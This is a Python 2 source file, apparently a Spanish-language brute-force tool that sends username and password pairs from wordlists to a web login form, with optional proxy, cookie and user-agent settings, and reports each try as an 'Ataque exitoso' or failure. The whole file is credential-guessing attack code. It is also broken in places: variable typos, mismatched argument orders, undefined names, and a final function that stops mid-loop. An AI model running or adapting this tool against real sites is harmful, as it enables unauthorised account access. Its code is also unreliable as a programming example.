#!/usr/bin/python

import requests
import argparse
import sys
from lxml.html import fromstring
import os.path
from termcolor import colored



def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip):
	
	print colored("\nBeginning BruteForce", 'yellow')
	mbefore = message
	requests.packages.urllib3.disable_warnings()		
	proxy = proxip + ':' + proxport
	proxies = {'http' : proxy, 'https' : proxy,}
	
	payadm1 = {userField: '', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm1 = requests.post(url,payadm1, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
			
	else:
		if cookie is None and agent is None:
			reqadm1 = requests.post(url,payadm1, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm1 = requests.post(url,payadm1,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
	
	
	payadm2 = {userField: '1', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm2 = requests.post(url,payadm2, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
	else:
		if cookie is None and agent is None:
			reqadm2 = requests.post(url,payadm2, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm2 = requests.post(url,payadm2,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
	
	
	payadm3 = {userField: '12', passField: ''}
	if len(proxip) ==0:
		if cookie is None and agent is None:
			reqadm3 = requests.post(url,payadm3, verify=False)
			
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
	
	else:
		if cookie is None and agent is None:
			reqadm3 = requests.post(url,payadm3, proxies = {'http':proxy},verify=False)
			
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm3 = requests.post(url,payadm3,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
		
	
	payload = { userField : user, passField: pwd}
	if len(proxip) ==0:
		if cookie is None and agent is None:
			r = requests.post(url,payload, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			r = requests.post(url,payload,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			r = requests.post(url,payload, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			r = requests.post(url,payload, cookies = cookies, headers = headers, verify=False)
	else:
		if cookie is None and agent is None:
			r = requests.post(url,payload, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			r = requests.post(url,payload,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			r = requests.post(url,payload, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			r = requests.post(url,payload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
		
	
	if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
		if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
			if int(verbose) == 1:
				print colored('Ataque no exitoso ', 'red')
			elif int (verbose) == 2:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
			elif int(verbose) == 3:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
		else:
			if int(verbose) == 1:
				print colored('Ataque exitoso ', 'green')
			elif int(verbose) == 2:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
			elif int(verbose) == 3:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
	
	elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
		if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
			if int(verbose) == 1:
				print colored('Ataque no exitoso ', 'red')
			elif int (verbose) == 2:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
			elif int(verbose) == 3:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
		else:
			if int(verbose) == 1:
				print colored('Ataque exitoso ', 'green')
			elif int(verbose) == 2:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
			elif int(verbose) == 3:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
	else: # Si no se puede determinar mediante content-lenght
		if mbefore in r.text:
			if int(verbose) == 1:
				print colored('Ataque no exitoso ', 'red')
			elif int (verbose) == 2:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
			elif int(verbose) == 3:
				print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
		else:
			if int(verbose) == 1:
				print colored('Ataque exitoso ', 'green')
			elif int(verbose) == 2:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
			elif int(verbose) == 3:
				print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(pwd,'blue')	
		
		
def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport):
	print colored("\nBeginning BruteForce", 'yellow')
	users = []
	requests.packages.urllib3.disable_warnings()		
	proxy = proxip + ':' + proxport
	proxies = {'http' : proxy, 'https' : proxy,}
	
	payadm1 = {userField: '', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm1 = requests.post(url,payadm1, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
			
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
	
	else:
		if cookie is None and agent is None:
			reqadm1 = requests.post(url,payadm1, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm1 = requests.post(url,payadm1,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, proxies = {'http':proxy},verify=False)
			
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers,proxies = {'http':proxy}, verify=False)
		
	payadm2 = {userField: '1', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm2 = requests.post(url,payadm2, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
	else:
		if cookie is None and agent is None:
			reqadm2 = requests.post(url,payadm2, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm2 = requests.post(url,payadm2,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
		
	payadm3 = {userField: '12', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm3 = requests.post(url,payadm3, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
			
	else:
		if cookie is None and agent is None:
			reqadm3 = requests.post(url,payadm3, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm3 = requests.post(url,payadm3,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
		
	if os.path.exists(userFile): #archivo con usuarios
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		for i in range(0,len(users)):	
			mbefore = message
				
			#Login
			payload = { userField : users[i].rstrip('\n'), passField: pwd}
			if len(proxip) == 0:
				if cookie is None and agent is None:
					r = requests.post(url,data = payload, verify=False)
		
				elif cookie is None and agent is not None:
					headers = {'user-agent': agent}
					r = requests.post(url,data = payload,headers = headers, verify=False)
				
				elif cookie is not None and agent is None:
					cookies = dict(cookies_are=cookie) 
					r = requests.post(url,data = payload, cookies = cookies, verify=False)
		
				elif cookie is not None and agent is not None:
					headers = {'user-agent': agent}
					cookies = dict(cookies_are=cookie) 
					r = requests.post(url,data = paload, cookies = cookies, headers = headers, verify=False)
			else:
				if cookie is None and agent is None:
					r = requests.post(url,data = payload, proxies = {'http':proxy},verify=False)
		
				elif cookie is None and agent is not None:
					headers = {'user-agent': agent}
					r = requests.post(url,data = payload,headers = headers, proxies = {'http':proxy},verify=False)
				
				elif cookie is not None and agent is None:
					cookies = dict(cookies_are=cookie) 
					r = requests.post(url,data = payload, cookies = cookies, proxies = {'http':proxy},verify=False)
		
				elif cookie is not None and agent is not None:
					headers = {'user-agent': agent}
					cookies = dict(cookies_are=cookie) 
					r = requests.post(url,data = paload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
				
			
			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(users[i])-1) == int(len(reqadm1.content)) and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
	
			elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
				if int(len(r.content)) == int(len(reqadm1.content)) or mbefore in r.content:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
	
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(pwd,'blue')
	

def pwdFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip):
	print colored("\nBeginning BruteForce", 'yellow')
	passwords = []
	proxy = proxyip + ':' + proxport
	proxies = {'http' : proxy, 'https' : proxy,}
	requests.packages.urllib3.disable_warnings()		
	
	payadm1 = {userField: '', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm1 = requests.post(url,payadm1, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
	else:
		if cookie is None and agent is None:
			reqadm1 = requests.post(url,payadm1, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm1 = requests.post(url,payadm1,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers,proxies = {'http':proxy}, verify=False)
		
	payadm2 = {userField: '1', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm2 = requests.post(url,payadm2, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
	else:
		if cookie is None and agent is None:
			reqadm2 = requests.post(url,payadm2, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm2 = requests.post(url,payadm2,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers,proxies = {'http':proxy}, verify=False)
		
	payadm3 = {userField: '12', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm3 = requests.post(url,payadm3, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
	else:
		if cookie is None and agent is None:
			reqadm3 = requests.post(url,payadm3, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm3 = requests.post(url,payadm3,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
		
	if os.path.exists(pwdFile): #archivo con usuarios
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(passwords)):
			#Antes del ataque
			mbefore = message
		
			#Login
			payload = { userField : user, passField: passwords[i].rstrip('\n')}
			if len(proxip) == 0:
				if cookie is None and agent is None:
					r = requests.post(url,data = payload, verify=False)
		
				elif cookie is None and agent is not None:
					headers = {'user-agent': agent}
					r = requests.post(url,data = payload,headers = headers, verify=False)
		
				elif cookie is not None and agent is None:
					cookies = dict(cookies_are=cookie) 
					r = requests.post(url,data = payload, cookies = cookies, verify=False)
		
				elif cookie is not None and agent is not None:
					headers = {'user-agent': agent}
					cookies = dict(cookies_are=cookie) 
					r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
			else:
				if cookie is None and agent is None:
					r = requests.post(url,data = payload, proxies = {'http':proxy},verify=False)
		
				elif cookie is None and agent is not None:
					headers = {'user-agent': agent}
					r = requests.post(url,data = payload,headers = headers,proxies = {'http':proxy}, verify=False)
		
				elif cookie is not None and agent is None:
					cookies = dict(cookies_are=cookie) 
					r = requests.post(url,data = payload, cookies = cookies, proxies = {'http':proxy},verify=False)
		
				elif cookie is not None and agent is not None:
					headers = {'user-agent': agent}
					cookies = dict(cookies_are=cookie) 
					r = requests.post(url,data = payload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
				
			if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
				if int(len(r.content)) - int(len(user)) == int(len(reqadm1.content)) and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
			
			elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
				if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
					
			else: # Si no se puede determinar mediante content-lenght
				if mbefore in r.text:
					if int(verbose) == 1:
						print colored('Ataque no exitoso ', 'red')
					elif int (verbose) == 2:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow')
					elif int(verbose) == 3:
						print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
				else:
					if int(verbose) == 1:
						print colored('Ataque exitoso ', 'green')
					elif int(verbose) == 2:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue')
					elif int(verbose) == 3:
						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')

	
def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,a,b,c,d,e,f,g,h):
	print colored("\nBeginning BruteForce", 'yellow')
	users = []
	passwords = []
	i = 0
	j = 0
	proxy = proxip + ',' + proxport
	proxies = {'http' : proxy, 'https' : proxy,}
	requests.packages.urllib3.disable_warnings()		
	
	payadm1 = {userField: '', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm1 = requests.post(url,payadm1, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm1 = requests.post(url,payadm1,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, verify=False)
	else:
		if cookie is None and agent is None:
			reqadm1 = requests.post(url,payadm1, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm1 = requests.post(url,payadm1,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm1 = requests.post(url,payadm1, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
		
	payadm2 = {userField: '1', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm2 = requests.post(url,payadm2, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm2 = requests.post(url,payadm2,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, verify=False)
	else:
		if cookie is None and agent is None:
			reqadm2 = requests.post(url,payadm2, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm2 = requests.post(url,payadm2,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm2 = requests.post(url,payadm2, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
		
	payadm3 = {userField: '12', passField: ''}
	if len(proxip) == 0:
		if cookie is None and agent is None:
			reqadm3 = requests.post(url,payadm3, verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm3 = requests.post(url,payadm3,headers = headers, verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, verify=False)
	else:
		if cookie is None and agent is None:
			reqadm3 = requests.post(url,payadm3, proxies = {'http':proxy},verify=False)
		
		elif cookie is None and agent is not None:
			headers = {'user-agent': agent}
			reqadm3 = requests.post(url,payadm3,headers = headers, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is None:
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, proxies = {'http':proxy},verify=False)
		
		elif cookie is not None and agent is not None:
			headers = {'user-agent': agent}
			cookies = dict(cookies_are=cookie) 
			reqadm3 = requests.post(url,payadm3, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
		
	if os.path.exists(userFile) and os.path.exists(pwdFile): # ambos archivos
		
		fo = open(userFile, 'r')
		for element in fo:
			users.append(element)
		fo.close()
		
		fo = open(pwdFile, 'r')
		for element in fo:
			passwords.append(element)
		fo.close()
		
		for i in range(0,len(users)):
			for j in range (0,len(passwords)):
				#Antes del ataque
				mbefore = message
				
				#Login
				
				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
				if len(proxip) == 0:
					if cookie is None and agent is None:
						r = requests.post(url,data = payload, verify=False)
		
					elif cookie is None and agent is not None:
						headers = {'user-agent': agent}
						r = requests.post(url,data = payload,headers = headers, verify=False)
		
					elif cookie is not None and agent is None:
						cookies = dict(cookies_are=cookie) 
						r = requests.post(url,data = payload, cookies = cookies, verify=False)
		
					elif cookie is not None and agent is not None:
						headers = {'user-agent': agent}
						cookies = dict(cookies_are=cookie) 
						r = requests.post(url,data = payload, cookies = cookies, headers = headers, verify=False)
				else:
					if cookie is None and agent is None:
						r = requests.post(url,data = payload, proxies = {'http':proxy},verify=False)
		
					elif cookie is None and agent is not None:
						headers = {'user-agent': agent}
						r = requests.post(url,data = payload,headers = headers, proxies = {'http':proxy},verify=False)
		
					elif cookie is not None and agent is None:
						cookies = dict(cookies_are=cookie) 
						r = requests.post(url,data = payload, cookies = cookies, proxies = {'http':proxy},verify=False)
		
					elif cookie is not None and agent is not None:
						headers = {'user-agent': agent}
						cookies = dict(cookies_are=cookie) 
						r = requests.post(url,data = payload, cookies = cookies, headers = headers, proxies = {'http':proxy},verify=False)
					
